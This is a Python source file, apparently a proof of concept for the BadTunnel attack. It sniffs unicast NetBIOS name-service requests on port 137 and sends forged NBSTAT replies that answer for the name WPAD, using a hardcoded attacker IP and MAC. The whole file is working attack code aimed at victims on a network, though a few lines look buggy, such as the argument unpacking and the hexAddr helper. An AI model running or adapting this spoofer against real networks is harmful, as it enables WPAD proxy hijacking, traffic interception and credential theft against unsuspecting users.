# BadTunnel.py
#
# Description: This program replys to NBNS requests with pre-defined answer.
# -----------------------------------------

# Imports
import socket
import collections
import sys
import string

# Offsets
IP_DST_START            = 32
IP_DST_END              = 40
TRANSACTION_ID_START    = 56
TRANSACTION_ID_END      = 60
SRC_PORT_START          = 40
SRC_PORT_END            = 44
IP_SRC_START            = 24
IP_SRC_END              = 32

# ---------------------------------
# Constants
ATTCKR_IP               = '172.16.0.54'
ATTCKR_IP_HEX           = "ac100036"
PORT                    = 137
WPAD_20                 = "\x57\x50\x41\x44\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
MAC_ADDR                = "\x78\xac\xc0\x95\x75\x26"
# ---------------------------------

class NB_ANS:      
        def __init__(self, packet, name, mac):

            # MAC address and name recevied from constants.
            self.data = packet
            self.name = name
            self.mac = mac

            # Building the NBNS packet.
            self.fields = collections.OrderedDict()
            self.fields["trID"]          = (self.data[TRANSACTION_ID_START:TRANSACTION_ID_END]).decode('hex')
            self.fields["Flags"]         = "\x84\x00"
            self.fields["Question"]      = "\x00\x00"
            self.fields["AnswerRRS"]     = "\x00\x01"
            self.fields["AuthorityRRS"]  = "\x00\x00"
            self.fields["AdditionalRRS"] = "\x00\x00"
            self.fields["rest"]          = "\x20\x43\x4b{}\x00".format("\x41"*30)
            self.fields["Type"]          = "\x00\x21"
            self.fields["Class"]         = "\x00\x01"
            self.fields["TTL"]           = "\x00\x00\xFF\xFF"

            # Data length calced for 1 name. Each name +18 bytes
            self.fields["Length"]        = "\x00\x41"
            self.fields["NameCount"]     = "\x01"
            self.fields["Name"]          = self.name
            self.fields["UniqueName"]    = "\x44\x00"
            self.fields["MAC"]           = self.mac
            self.fields["Pad"]           = "\x00"*40

        def packetize(self):
            return bytes("".join(self.fields.values()))
def hexAddr(addr):
    octet = string.split(addr, ".")
    return "{}{}{}{}".format(hex(octet[0])[2:], hex(octet[1])[2:], hex(octet[2])[2:], hex(octet[3])[2:])
    
def main():
    attacker_ip, attacker_mac = sys.argv[1:2]
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    sniffer.bind((attacker_ip, 0))
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    print "Sniffing.."
    
    # Sniffing Loop
    while True:
        data, addr = sniffer.recvfrom(65535)
        data = data.encode('hex')
        
        # Checks if port is 137 (NBNS) and the packet is in unicast.
        if int(data[SRC_PORT_START:SRC_PORT_END], 16) == PORT and \
        data[IP_DST_START:IP_DST_END] == ATTCKR_IP_HEX:
            print "-------------"
            print "[X] Recieved unicast on port 137 (NBNS)"
            
            # Extracting the source ip address
            ip_hex = data[IP_SRC_START:IP_SRC_END]
            ip_dec = "{}.{}.{}.{}".format(int(ip_hex[0:2], 16), int(ip_hex[2:4], 16), int(ip_hex[4:6], 16), int(ip_hex[6:8], 16))
            print "[-] from {}".format(ip_dec)

            # Closing the sniffer to unbind 137.
            sniffer.close()
            
            # Start answering to packet.
            reply = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            reply.bind((ATTCKR_IP, PORT))
            reply.settimeout(2)

            # Building the NBSTAT response.
            packet = NB_ANS(data, WPAD_20, MAC_ADDR)

            # Sending the packet to the victim.
            reply.sendto(NB_ANS.packetize(packet), (ip_dec, PORT))
            reply.close()
            print "[-] Reply sent to {}!".format(ip_dec)

            # Starts sniffing again.
            sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            sniffer.bind((ATTCKR_IP, 0))
            sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

if __name__ == "__main__":
    main()
